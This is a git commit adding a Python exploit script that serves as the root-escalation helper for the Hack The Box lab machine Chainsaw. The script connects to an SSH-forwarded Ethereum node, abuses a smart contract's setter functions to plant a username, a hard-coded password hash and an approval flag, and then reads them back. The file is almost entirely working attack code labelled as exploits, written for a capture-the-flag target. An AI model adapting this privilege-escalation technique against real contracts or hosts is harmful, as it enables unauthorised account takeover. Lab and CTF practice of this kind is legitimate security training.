da597c072c42b461898d4fe8e5473f44688b62df
kmahyyg <16604643+kmahyyg@users.noreply.github.com>
2019-07-24 14:00:36 +0800

    add root helper of chainsaw

---
+++ chainsaw-ROOT-web3-contract.py
@@ -0,0 +1,123 @@
+#!/usr/bin/env python3
+# -*- encoding:utf-8 -*-
+#
+# Licensed under AGPL v3
+# Copyright(C) 2019 kmahyyg
+#
+
+from web3 import Web3
+import logging
+import json
+import sys
+import requests
+
+logger = logging.getLogger('default_log')
+handler = logging.StreamHandler()
+formatter = logging.Formatter("%(levelname)s | %(message)s")
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+logger.setLevel(logging.INFO)
+
+
+# Print help
+def printusage():
+    print("Can only be used in Chainsaw - HTB, as a helper function of getting root.")
+    print("Usage: " + sys.argv[0] + " <CONTRACT ADDRESS>")
+
+
+# Get predefined address
+try:
+    ftp_contraddr = sys.argv[1]
+    logger.info("Predefined Contract Address: " + ftp_contraddr)
+except IndexError:
+    logger.error("Predefined Contract Address not found")
+    printusage()
+    sys.exit(1)
+
+
+# SSH Port Forward
+ethneturl = "http://localhost:8545"
+logger.info("The 127.0.0.1:63991 should be SSH-forwarded to {localip} as bobby@10.10.10.142".format(localip=ethneturl))
+
+# predenfined contract address read from the file
+predefined_cont_addr = Web3.toChecksumAddress(ftp_contraddr)
+logger.info("YOU SHOULD MODIFY THE ADDRESS AND PAYLOAD BEFORE RUN THIS SCRIPT!")
+input("Please confirm the above notification, then press enter to continue")
+
+# Detect if port-forward working
+r = requests.get(ethneturl, timeout=5)
+if r.status_code == 400:
+    logger.info("Port Forward seems working, go to next step...")
+else:
+    logger.error("Private ETH Network forward to {localip} is not successful.".format(localip=ethneturl))
+    sys.exit(1)
+
+
+# Web3Py related code
+w3eng = Web3(Web3.HTTPProvider(ethneturl))
+
+network_status = w3eng.isConnected()
+logger.info("Check if connected: " + str(network_status))
+if not network_status:
+    print("System network does not connect.")
+    sys.exit(1)
+
+logger.info("Trying to dump the accounts...")
+all_acc = w3eng.eth.accounts
+w3eng.eth.defaultAccount = all_acc[0]
+cont_json = open('assets/ChainsawClub.json', 'r').read()
+cont_json = json.loads(cont_json)
+cur_abi = cont_json['abi']
+cur_cont_addr = predefined_cont_addr
+cur_cont = w3eng.eth.contract(address=cur_cont_addr, abi=cur_abi)
+cur_cont_funcs = cur_cont.functions
+logger.info("Get Contract Functions: " + str(cur_cont_funcs))
+
+# SET PASSWORD AND NEW USER
+
+exploit1 = cur_cont_funcs.setUsername('nobody').transact()
+logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit1))
+logger.info("Waiting for transaction to be mined...")
+receipt = w3eng.eth.waitForTransactionReceipt(exploit1)
+print("Receipt Found: ", sep='')
+print(w3eng.eth.getTransactionReceipt(exploit1))
+
+exploit2 = cur_cont_funcs.setPassword('7b455ca1ffcb9f3828cfdde4a396139e').transact()
+logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit2))
+logger.info("Waiting for transaction to be mined...")
+receipt = w3eng.eth.waitForTransactionReceipt(exploit2)
+print("Receipt Found: ", sep='')
+print(w3eng.eth.getTransactionReceipt(exploit2))
+
+exploit3 = cur_cont_funcs.setApprove(True).transact()
+logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit3))
+logger.info("Waiting for transaction to be mined...")
+receipt = w3eng.eth.waitForTransactionReceipt(exploit3)
+print("Receipt Found: ", sep='')
+print(w3eng.eth.getTransactionReceipt(exploit3))
+
+exploit4 = cur_cont_funcs.transfer(8).transact()
+logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit4))
+logger.info("Waiting for transaction to be mined...")
+receipt = w3eng.eth.waitForTransactionReceipt(exploit4)
+print("Receipt Found: ", sep='')
+print(w3eng.eth.getTransactionReceipt(exploit4))
+
+# Get result
+
+exploit5 = cur_cont_funcs.getUsername().call()
+print(exploit5)
+
+exploit6 = cur_cont_funcs.getPassword().call()
+print(exploit6)
+
+exploit7 = cur_cont_funcs.getApprove().call()
+print(exploit7)
+
+exploit8 = cur_cont_funcs.getSupply().call()
+print(exploit8)
+
+exploit9 = cur_cont_funcs.getBalance().call()
+print(exploit9)
+
+logger.info("DONE!")
